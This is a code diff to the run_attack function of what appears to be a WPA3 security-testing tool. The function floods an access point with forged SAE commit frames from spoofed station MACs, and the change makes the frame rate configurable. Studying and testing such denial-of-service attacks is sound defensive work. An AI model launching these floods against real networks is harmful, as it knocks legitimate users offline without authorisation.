@@ -55,6 +55,7 @@ void run_attack(RunStatus &rs) {
 	const auto &att_cfg = rs.config().at("attack_config");
 	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
 	const int burst_size = att_cfg.at("burst_size").get<int>();
+	const size_t fps_limit = att_cfg.at("frames_per_second_limit").get<size_t>();
 	const int acm_threshold = att_cfg.at("acm_threshold").get<int>();
 	const bool random_dh = att_cfg.at("random_dh_groups").get<bool>();
 	const bool use_conn_stas = att_cfg.at("use_connected_stas").get<bool>();
@@ -94,11 +95,11 @@ void run_attack(RunStatus &rs) {
 	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
 	dos_helpers::timed_burst(
-		sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL, [&]() -> optional<RadioTap> {
+		sender, attack_time, static_cast<size_t>(burst_size), fps_limit, [&]() -> optional<RadioTap> {
 			const auto &sta_mac = mac_pool[frame_idx % mac_pool.size()];
 			const uint16_t gid = random_dh ? available_groups[frame_idx % available_groups.size()] : available_groups.front();
 			frame_idx++;
-			return make_sae_commit(ap_mac, sta_mac, sae_per_group.at(gid));
+			return wpa3_tester::sae_helper::make_sae_commit(ap_mac, sta_mac, sae_per_group.at(gid));
 		});
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
